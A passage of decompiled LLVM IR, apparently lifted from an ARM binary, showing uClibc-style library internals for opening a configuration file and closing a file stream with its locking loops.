  uselistorder label %dec_label_pc_16b84, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16b98 = load i32, i32* @r4, align 4
  store i32 %v3_16b98, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33972), i32* @r1, align 4
  %v0_16ba0 = call i32 @__GI_fopen()
  store i32 %v0_16ba0, i32* %r0.global-to-local, align 4
  store i32 %v0_16ba0, i32* @r4, align 4
  %v2_16ba4 = icmp eq i32 %v0_16ba0, 0
  br i1 %v2_16ba4, label %bb, label %dec_label_pc_16bb0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16bb0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16bb8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_16bb8, i32* %r0.global-to-local, align 4
  %v2_16bbc = icmp eq i32 %v2_16bb8, 0
  br i1 %v2_16bbc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_16bb0
  %v1_16bc0 = load i32, i32* @r4, align 4
  %v3_16bc0 = inttoptr i32 %v2_16bb8 to i32*
  store i32 %v1_16bc0, i32* %v3_16bc0, align 4
  %v1_16bc8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_16bb0, %bb4
  %v1_16bc8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_16bb0 ], [ %v1_16bc8.pre, %bb4 ]
  %v2_16bc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16bc4, i32* @r4, align 4
  ret i32 %v1_16bc8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 36, 34, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16bd4 = load i32, i32* @r4, align 4
  store i32 %v3_16bd4, i32* %stack_var_-36, align 4
  %v6_16bd4 = load i32, i32* @r5, align 4
  %v9_16bd4 = load i32, i32* @r6, align 4
  %v12_16bd4 = load i32, i32* @r7, align 4
  %v2_16bd8 = add i32 %tmp, 52
  %v3_16bd8 = inttoptr i32 %v2_16bd8 to i32*
  %v4_16bd8 = load i32, i32* %v3_16bd8, align 4
  store i32 %v4_16bd8, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16be0 = icmp eq i32 %v4_16bd8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r8, align 4
  br i1 %v2_16be0, label %dec_label_pc_16bf4, label %dec_label_pc_16c58

dec_label_pc_16bf4:                               ; preds = %entry
  %v0_16bf4 = call i32 @__aeabi_read_tp()
  store i32 %v0_16bf4, i32* %r0.global-to-local, align 4
  %v0_16bf8 = load i32, i32* @r5, align 4
  %v1_16bf8 = add i32 %v0_16bf8, 64
  %v2_16bf8 = inttoptr i32 %v1_16bf8 to i32*
  %v3_16bf8 = load i32, i32* %v2_16bf8, align 4
  store i32 %v3_16bf8, i32* %r3.global-to-local, align 4
  %v1_16bfc = add i32 %v0_16bf4, -1168
  store i32 %v1_16bfc, i32* @r6, align 4
  %v3_16c00 = icmp uge i32 %v3_16bf8, %v1_16bfc
  store i1 %v3_16c00, i1* %cpsr_c.global-to-local, align 1
  %v9_16c00 = icmp eq i32 %v3_16bf8, %v1_16bfc
  br i1 %v9_16c00, label %dec_label_pc_16c4c, label %dec_label_pc_16c08

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16bf4
  %v1_16c08 = add i32 %v0_16bf8, 56
  store i32 %v1_16c08, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_16c08, i32* %r2.global-to-local, align 4
  %v0_16c14 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16c14, i32* @r4, align 4
  %v1_16c18115 = inttoptr i32 %v1_16c08 to i32*
  %v2_16c18116 = load i32, i32* %v1_16c18115, align 4
  store i32 %v2_16c18116, i32* %r3.global-to-local, align 4
  %v3_16c1c118 = icmp uge i32 %v2_16c18116, %v0_16c14
  store i1 %v3_16c1c118, i1* %cpsr_c.global-to-local, align 1
  %v9_16c1c124 = icmp eq i32 %v2_16c18116, %v0_16c14
  br i1 %v9_16c1c124, label %dec_label_pc_16c24, label %dec_label_pc_16c3c

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16c08, %dec_label_pc_16c24.dec_label_pc_16c18_crit_edge
  %v0_16c24125 = phi i32 [ %v1_16c1c.pre, %dec_label_pc_16c24.dec_label_pc_16c18_crit_edge ], [ %v0_16c14, %dec_label_pc_16c08 ]
  store i32 %v0_16c24125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c34 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c34, label %dec_label_pc_16c38, label %dec_label_pc_16c24.dec_label_pc_16c18_crit_edge

dec_label_pc_16c24.dec_label_pc_16c18_crit_edge:  ; preds = %dec_label_pc_16c24
  %v0_16c18.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c1c.pre = load i32, i32* @r4, align 4
  %v1_16c18 = inttoptr i32 %v0_16c18.pre to i32*
  %v2_16c18 = load i32, i32* %v1_16c18, align 4
  store i32 %v2_16c18, i32* %r3.global-to-local, align 4
  %v3_16c1c = icmp uge i32 %v2_16c18, %v1_16c1c.pre
  store i1 %v3_16c1c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c1c = icmp eq i32 %v2_16c18, %v1_16c1c.pre
  br i1 %v9_16c1c, label %dec_label_pc_16c24, label %dec_label_pc_16c3c

dec_label_pc_16c38:                               ; preds = %dec_label_pc_16c24
  %v0_16c38 = load i32, i32* @r4, align 4
  store i32 %v0_16c38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16c08, %dec_label_pc_16c24.dec_label_pc_16c18_crit_edge, %dec_label_pc_16c38
  %v0_16c3c = phi i32 [ %v0_16c38, %dec_label_pc_16c38 ], [ %v2_16c18116, %dec_label_pc_16c08 ], [ %v2_16c18, %dec_label_pc_16c24.dec_label_pc_16c18_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c3c = icmp eq i32 %v0_16c3c, 0
  br i1 %v2_16c3c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_16c3c
  %v1_16c40 = load i32, i32* @r7, align 4
  store i32 %v1_16c40, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16c3c, %bb
  %v1_16c44 = xor i1 %v2_16c3c, true
  call void @__pseudo_cond_branch(i1 %v1_16c44, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_16c48 = load i32, i32* @r6, align 4
  %v1_16c48 = load i32, i32* @r5, align 4
  %v2_16c48 = add i32 %v1_16c48, 64
  %v3_16c48 = inttoptr i32 %v2_16c48 to i32*
  store i32 %v0_16c48, i32* %v3_16c48, align 4
  %v0_16c4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16bf4, %bb41
  %v0_16c4c = phi i32 [ %v0_16bf8, %dec_label_pc_16bf4 ], [ %v0_16c4c.pre, %bb41 ]
  %v1_16c4c = add i32 %v0_16c4c, 60
  %v2_16c4c = inttoptr i32 %v1_16c4c to i32*
  %v3_16c4c = load i32, i32* %v2_16c4c, align 4
  %v1_16c50 = add i32 %v3_16c4c, 1
  store i32 %v1_16c50, i32* %r3.global-to-local, align 4
  store i32 %v1_16c50, i32* %v2_16c4c, align 4
  %v0_16c58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c58

dec_label_pc_16c58:                               ; preds = %entry, %dec_label_pc_16c4c
  %v1_16c60 = phi i32 [ %tmp, %entry ], [ %v0_16c58.pre, %dec_label_pc_16c4c ]
  %v1_16c58 = inttoptr i32 %v1_16c60 to i16*
  %v2_16c58 = load i16, i16* %v1_16c58, align 2
  %v3_16c58 = zext i16 %v2_16c58 to i32
  store i32 %v3_16c58, i32* %r3.global-to-local, align 4
  %v1_16c5c = and i32 %v3_16c58, 64
  %v2_16c5c = icmp eq i32 %v1_16c5c, 0
  br i1 %v2_16c5c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_16c58
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_16c58, %bb42
  %storemerge = phi i32 [ %v1_16c60, %bb42 ], [ %v1_16c5c, %dec_label_pc_16c58 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 93288, i32* @lr, align 4
  %v1_16c64 = xor i1 %v2_16c5c, true
  call void @__pseudo_cond_branch(i1 %v1_16c64, i32 ptrtoint (i32* @global_var_17aa8.736 to i32))
  %v0_16c68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16c68, i32* %fp.global-to-local, align 4
  %v0_16c6c = load i32, i32* @r5, align 4
  %v1_16c6c = add i32 %v0_16c6c, 4
  %v2_16c6c = inttoptr i32 %v1_16c6c to i32*
  %v3_16c6c = load i32, i32* %v2_16c6c, align 4
  store i32 %v3_16c6c, i32* %r0.global-to-local, align 4
  %v1_16c70 = call i32 @__GI___libc_close(i32 %v3_16c6c)
  store i32 %v1_16c70, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16c78 = load i32, i32* @r8, align 4
  %v2_16c78 = add i32 %v0_16c78, 160
  %v3_16c78 = inttoptr i32 %v2_16c78 to i32*
  %v4_16c78 = load i32, i32* %v3_16c78, align 4
  store i32 %v4_16c78, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16c7c = icmp slt i32 %v1_16c70, 0
  br i1 %v1_16c7c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16c84 = add i32 %v4_16c78, 8
  %v2_16c84 = inttoptr i32 %v1_16c84 to i32*
  %v3_16c84 = load i32, i32* %v2_16c84, align 4
  store i32 %v3_16c84, i32* %r3.global-to-local, align 4
  %v0_16c88 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c88, i32* %r0.global-to-local, align 4
  %v1_16c8c = add i32 %v0_16c88, -1168
  store i32 %v1_16c8c, i32* %sl.global-to-local, align 4
  %v0_16c90 = load i32, i32* %r3.global-to-local, align 4
  %v3_16c90 = icmp uge i32 %v0_16c90, %v1_16c8c
  store i1 %v3_16c90, i1* %cpsr_c.global-to-local, align 1
  %v9_16c90 = icmp eq i32 %v0_16c90, %v1_16c8c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16c98 = load i32, i32* @r5, align 4
  %v2_16c98 = add i32 %v1_16c98, 4
  %v3_16c98 = inttoptr i32 %v2_16c98 to i32*
  store i32 -1, i32* %v3_16c98, align 4
  br i1 %v9_16c90, label %dec_label_pc_16ce0, label %dec_label_pc_16ca0

dec_label_pc_16ca0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16ca4 = load i32, i32* @r7, align 4
  store i32 %v0_16ca4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16cac108 = inttoptr i32 %v0_16ca4 to i32*
  %v2_16cac109 = load i32, i32* %v1_16cac108, align 4
  store i32 %v2_16cac109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16cb0111 = icmp eq i32 %v2_16cac109, 0
  br i1 %v9_16cb0111, label %dec_label_pc_16cb8, label %dec_label_pc_16cd0

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16ca0, %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge
  %v0_16cb8112 = phi i32 [ %v1_16cb0.pre, %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge ], [ 0, %dec_label_pc_16ca0 ]
  store i32 %v0_16cb8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16cc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16cc8, label %dec_label_pc_16ccc, label %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge

dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge:  ; preds = %dec_label_pc_16cb8
  %v0_16cac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cb0.pre = load i32, i32* @r4, align 4
  %v1_16cac = inttoptr i32 %v0_16cac.pre to i32*
  %v2_16cac = load i32, i32* %v1_16cac, align 4
  store i32 %v2_16cac, i32* %r3.global-to-local, align 4
  %v3_16cb0 = icmp uge i32 %v2_16cac, %v1_16cb0.pre
  store i1 %v3_16cb0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cb0 = icmp eq i32 %v2_16cac, %v1_16cb0.pre
  br i1 %v9_16cb0, label %dec_label_pc_16cb8, label %dec_label_pc_16cd0

dec_label_pc_16ccc:                               ; preds = %dec_label_pc_16cb8
  %v0_16ccc = load i32, i32* @r4, align 4
  store i32 %v0_16ccc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16ca0, %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge, %dec_label_pc_16ccc
  %v0_16cd0 = phi i32 [ %v0_16ccc, %dec_label_pc_16ccc ], [ %v2_16cac109, %dec_label_pc_16ca0 ], [ %v2_16cac, %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge ]
  %v1_16cd0 = phi i32 [ %v0_16ccc, %dec_label_pc_16ccc ], [ 0, %dec_label_pc_16ca0 ], [ %v1_16cb0.pre, %dec_label_pc_16cb8.dec_label_pc_16cac_crit_edge ]
  %v3_16cd0 = icmp uge i32 %v0_16cd0, %v1_16cd0
  store i1 %v3_16cd0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cd0 = icmp eq i32 %v0_16cd0, %v1_16cd0
  br i1 %v9_16cd0, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16cd0
  %v1_16cd4 = load i32, i32* @r7, align 4
  store i32 %v1_16cd4, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16cd0, %bb46
  %v1_16cd8 = xor i1 %v9_16cd0, true
  call void @__pseudo_cond_branch(i1 %v1_16cd8, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_16cdc = load i32, i32* %sl.global-to-local, align 4
  %v1_16cdc = load i32, i32* @r7, align 4
  %v2_16cdc = add i32 %v1_16cdc, 8
  %v3_16cdc = inttoptr i32 %v2_16cdc to i32*
  store i32 %v0_16cdc, i32* %v3_16cdc, align 4
  br label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16ce4 = load i32, i32* @r8, align 4
  %v2_16ce4 = add i32 %v0_16ce4, 160
  %v3_16ce4 = inttoptr i32 %v2_16ce4 to i32*
  %v4_16ce4 = load i32, i32* %v3_16ce4, align 4
  store i32 %v4_16ce4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16cec = add i32 %v0_16ce4, 12
  %v3_16cec = inttoptr i32 %v2_16cec to i32*
  %v4_16cec = load i32, i32* %v3_16cec, align 4
  store i32 %v4_16cec, i32* %r2.global-to-local, align 4
  %v1_16cf0 = add i32 %v4_16ce4, 4
  %v2_16cf0 = inttoptr i32 %v1_16cf0 to i32*
  %v3_16cf0 = load i32, i32* %v2_16cf0, align 4
  store i32 %v3_16cf0, i32* %r1.global-to-local, align 4
  %v1_16cf4 = inttoptr i32 %v4_16cec to i32*
  %v2_16cf4 = load i32, i32* %v1_16cf4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cf8 = icmp eq i32 %v3_16cf0, 0
  %v1_16cfc = add i32 %v2_16cf4, 1
  store i32 %v1_16cfc, i32* %r3.global-to-local, align 4
  store i32 %v1_16cfc, i32* %v1_16cf4, align 4
  br i1 %v2_16cf8, label %dec_label_pc_16d08, label %dec_label_pc_16d68

dec_label_pc_16d08:                               ; preds = %dec_label_pc_16ce0
  %v0_16d08 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d08 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d08 = add i32 %v1_16d08, 8
  %v3_16d08 = inttoptr i32 %v2_16d08 to i32*
  store i32 %v0_16d08, i32* %v3_16d08, align 4
  %v0_16d0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d0c, i32* @r7, align 4
  br label %dec_label_pc_16d10

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16d40.dec_label_pc_16d10_crit_edge, %dec_label_pc_16d08
  %v0_16d10 = phi i32 [ %v0_16d10.pre, %dec_label_pc_16d40.dec_label_pc_16d10_crit_edge ], [ %v0_16d0c, %dec_label_pc_16d08 ]
  %v1_16d10 = inttoptr i32 %v0_16d10 to i32*
  %v2_16d10 = load i32, i32* %v1_16d10, align 4
  store i32 %v2_16d10, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d10, i32* %r2.global-to-local, align 4
  %v2_16d1c96 = load i32, i32* %v1_16d10, align 4
  store i32 %v2_16d1c96, i32* %r3.global-to-local, align 4
  %v3_16d2098 = icmp uge i32 %v2_16d1c96, %v2_16d10
  store i1 %v3_16d2098, i1* %cpsr_c.global-to-local, align 1
  %v9_16d20104 = icmp eq i32 %v2_16d1c96, %v2_16d10
  br i1 %v9_16d20104, label %dec_label_pc_16d28, label %dec_label_pc_16d40

dec_label_pc_16d28:                               ; preds = %dec_label_pc_16d10, %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge
  %v0_16d28105 = phi i32 [ %v1_16d20.pre, %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge ], [ %v2_16d10, %dec_label_pc_16d10 ]
  store i32 %v0_16d28105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d38, label %dec_label_pc_16d3c, label %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge

dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge:  ; preds = %dec_label_pc_16d28
  %v0_16d1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d20.pre = load i32, i32* @r4, align 4
  %v1_16d1c = inttoptr i32 %v0_16d1c.pre to i32*
  %v2_16d1c = load i32, i32* %v1_16d1c, align 4
  store i32 %v2_16d1c, i32* %r3.global-to-local, align 4
  %v3_16d20 = icmp uge i32 %v2_16d1c, %v1_16d20.pre
  store i1 %v3_16d20, i1* %cpsr_c.global-to-local, align 1
  %v9_16d20 = icmp eq i32 %v2_16d1c, %v1_16d20.pre
  br i1 %v9_16d20, label %dec_label_pc_16d28, label %dec_label_pc_16d40

dec_label_pc_16d3c:                               ; preds = %dec_label_pc_16d28
  %v0_16d3c = load i32, i32* @r4, align 4
  store i32 %v0_16d3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d40

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d10, %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge, %dec_label_pc_16d3c
  %v0_16d48 = phi i32 [ %v0_16d3c, %dec_label_pc_16d3c ], [ %v2_16d1c96, %dec_label_pc_16d10 ], [ %v2_16d1c, %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge ]
  %v1_16d40 = phi i32 [ %v0_16d3c, %dec_label_pc_16d3c ], [ %v2_16d10, %dec_label_pc_16d10 ], [ %v1_16d20.pre, %dec_label_pc_16d28.dec_label_pc_16d1c_crit_edge ]
  %v3_16d40 = icmp uge i32 %v0_16d48, %v1_16d40
  store i1 %v3_16d40, i1* %cpsr_c.global-to-local, align 1
  %v9_16d40 = icmp eq i32 %v0_16d48, %v1_16d40
  br i1 %v9_16d40, label %dec_label_pc_16d48, label %dec_label_pc_16d40.dec_label_pc_16d10_crit_edge

dec_label_pc_16d40.dec_label_pc_16d10_crit_edge:  ; preds = %dec_label_pc_16d40
  %v0_16d10.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16d10

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d40
  %v2_16d48 = icmp ne i32 %v1_16d40, 0
  store i1 %v2_16d48, i1* %cpsr_c.global-to-local, align 1
  %v7_16d4c = icmp slt i32 %v1_16d40, 2
  br i1 %v7_16d4c, label %dec_label_pc_16d68, label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d48
  %v0_16d50 = load i32, i32* @r7, align 4
  store i32 %v0_16d50, i32* %r0.global-to-local, align 4
  %v0_16d54 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d54 = add i32 %v0_16d54, 129
  store i32 %v1_16d54, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d68

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16ce0, %dec_label_pc_16d50, %dec_label_pc_16d48
  %v0_16d68 = load i32, i32* @r5, align 4
  %v1_16d68 = inttoptr i32 %v0_16d68 to i16*
  %v2_16d68 = load i16, i16* %v1_16d68, align 2
  %v3_16d68 = zext i16 %v2_16d68 to i32
  %v1_16d6c = and i32 %v3_16d68, 24576
  %v1_16d70 = or i32 %v1_16d6c, 48
  store i32 %v1_16d70, i32* %r3.global-to-local, align 4
  %v0_16d74 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d74 = icmp eq i32 %v0_16d74, 0
  %v1_16d78 = trunc i32 %v1_16d70 to i16
  store i16 %v1_16d78, i16* %v1_16d68, align 2
  br i1 %v2_16d74, label %dec_label_pc_16d80, label %dec_label_pc_16df4

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16d68
  %v0_16d80 = load i32, i32* @r5, align 4
  %v1_16d80 = add i32 %v0_16d80, 60
  %v2_16d80 = inttoptr i32 %v1_16d80 to i32*
  %v3_16d80 = load i32, i32* %v2_16d80, align 4
  %v1_16d84 = add i32 %v3_16d80, -1
  store i32 %v1_16d84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d88 = icmp eq i32 %v1_16d84, 0
  store i32 %v1_16d84, i32* %v2_16d80, align 4
  br i1 %v2_16d88, label %dec_label_pc_16d94, label %dec_label_pc_16df4

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d80
  %v0_16d94 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d94 = load i32, i32* @r5, align 4
  %v2_16d94 = add i32 %v1_16d94, 64
  %v3_16d94 = inttoptr i32 %v2_16d94 to i32*
  store i32 %v0_16d94, i32* %v3_16d94, align 4
  %v0_16d98 = load i32, i32* @r5, align 4
  %v1_16d98 = add i32 %v0_16d98, 56
  store i32 %v1_16d98, i32* @r6, align 4
  br label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16dcc.dec_label_pc_16d9c_crit_edge, %dec_label_pc_16d94
  %v0_16da4 = phi i32 [ %v0_16da4.pre, %dec_label_pc_16dcc.dec_label_pc_16d9c_crit_edge ], [ %v1_16d98, %dec_label_pc_16d94 ]
  %v0_16d9c = phi i32 [ %v0_16d9c.pre, %dec_label_pc_16dcc.dec_label_pc_16d9c_crit_edge ], [ %v0_16d98, %dec_label_pc_16d94 ]
  %v1_16d9c = add i32 %v0_16d9c, 56
  %v2_16d9c = inttoptr i32 %v1_16d9c to i32*
  %v3_16d9c = load i32, i32* %v2_16d9c, align 4
  store i32 %v3_16d9c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16da4, i32* %r2.global-to-local, align 4
  %v1_16da882 = inttoptr i32 %v0_16da4 to i32*
  %v2_16da883 = load i32, i32* %v1_16da882, align 4
  store i32 %v2_16da883, i32* %r3.global-to-local, align 4
  %v3_16dac85 = icmp uge i32 %v2_16da883, %v3_16d9c
  store i1 %v3_16dac85, i1* %cpsr_c.global-to-local, align 1
  %v9_16dac91 = icmp eq i32 %v2_16da883, %v3_16d9c
  br i1 %v9_16dac91, label %dec_label_pc_16db4, label %dec_label_pc_16dcc

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d9c, %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge
  %v0_16db492 = phi i32 [ %v1_16dac.pre, %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge ], [ %v3_16d9c, %dec_label_pc_16d9c ]
  store i32 %v0_16db492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16dc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16dc4, label %dec_label_pc_16dc8, label %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge

dec_label_pc_16db4.dec_label_pc_16da8_crit_edge:  ; preds = %dec_label_pc_16db4
  %v0_16da8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16dac.pre = load i32, i32* @r4, align 4
  %v1_16da8 = inttoptr i32 %v0_16da8.pre to i32*
  %v2_16da8 = load i32, i32* %v1_16da8, align 4
  store i32 %v2_16da8, i32* %r3.global-to-local, align 4
  %v3_16dac = icmp uge i32 %v2_16da8, %v1_16dac.pre
  store i1 %v3_16dac, i1* %cpsr_c.global-to-local, align 1
  %v9_16dac = icmp eq i32 %v2_16da8, %v1_16dac.pre
  br i1 %v9_16dac, label %dec_label_pc_16db4, label %dec_label_pc_16dcc

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16db4
  %v0_16dc8 = load i32, i32* @r4, align 4
  store i32 %v0_16dc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16dcc

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16d9c, %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge, %dec_label_pc_16dc8
  %v0_16dd4 = phi i32 [ %v0_16dc8, %dec_label_pc_16dc8 ], [ %v2_16da883, %dec_label_pc_16d9c ], [ %v2_16da8, %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge ]
  %v1_16dcc = phi i32 [ %v0_16dc8, %dec_label_pc_16dc8 ], [ %v3_16d9c, %dec_label_pc_16d9c ], [ %v1_16dac.pre, %dec_label_pc_16db4.dec_label_pc_16da8_crit_edge ]
  %v3_16dcc = icmp uge i32 %v0_16dd4, %v1_16dcc
  store i1 %v3_16dcc, i1* %cpsr_c.global-to-local, align 1
  %v9_16dcc = icmp eq i32 %v0_16dd4, %v1_16dcc
  br i1 %v9_16dcc, label %dec_label_pc_16dd4, label %dec_label_pc_16dcc.dec_label_pc_16d9c_crit_edge

dec_label_pc_16dcc.dec_label_pc_16d9c_crit_edge:  ; preds = %dec_label_pc_16dcc
  %v0_16d9c.pre = load i32, i32* @r5, align 4
  %v0_16da4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16d9c

dec_label_pc_16dd4:                               ; preds = %dec_label_pc_16dcc
  %v2_16dd4 = icmp ne i32 %v1_16dcc, 0
  store i1 %v2_16dd4, i1* %cpsr_c.global-to-local, align 1
  %v7_16dd8 = icmp slt i32 %v1_16dcc, 2
  br i1 %v7_16dd8, label %dec_label_pc_16df4, label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16dd4
  %v0_16ddc = load i32, i32* @r5, align 4
  %v1_16ddc = add i32 %v0_16ddc, 56
  store i32 %v1_16ddc, i32* %r0.global-to-local, align 4
  %v0_16de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16de0 = add i32 %v0_16de0, 129
  store i32 %v1_16de0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16df4

dec_label_pc_16df4:                               ; preds = %dec_label_pc_16d80, %dec_label_pc_16d68, %dec_label_pc_16ddc, %dec_label_pc_16dd4
  %v0_16df4 = load i32, i32* @r5, align 4
  %v1_16df4 = inttoptr i32 %v0_16df4 to i16*
  %v2_16df4 = load i16, i16* %v1_16df4, align 2
  %v3_16df4 = zext i16 %v2_16df4 to i32
  store i32 %v3_16df4, i32* %r3.global-to-local, align 4
  %v1_16df8 = and i32 %v3_16df4, 16384
  %v2_16df8 = icmp eq i32 %v1_16df8, 0
